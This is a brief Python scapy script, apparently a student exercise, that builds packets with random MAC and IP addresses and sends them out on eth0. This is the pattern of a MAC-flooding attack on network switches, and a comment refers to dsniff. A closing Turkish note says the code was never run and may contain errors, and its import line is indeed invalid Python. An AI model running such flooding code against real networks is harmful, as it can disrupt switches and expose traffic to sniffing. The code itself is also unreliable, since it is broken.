#sudo apt-get install dsniff
import scapy.all from *

pcktList = []

for i in range(10):
    srcMac = RandMAC()
    dstMac = RandMAC()
    srcIP = RandIP()
    dstIP = RandIP()

    ether = Ether(src=srcMac, dst=dstMac)
    ip = IP(src=srcIP, dst=dstIP)

    pckt = ether/ip
    pcktList.append(pckt)

sendp(pcktList, iface="eth0", verbose=False)
"""Dandik bir saldırı olduğunu düşündüğüm için kodu çalıştırmadım. Hata olabilir."""
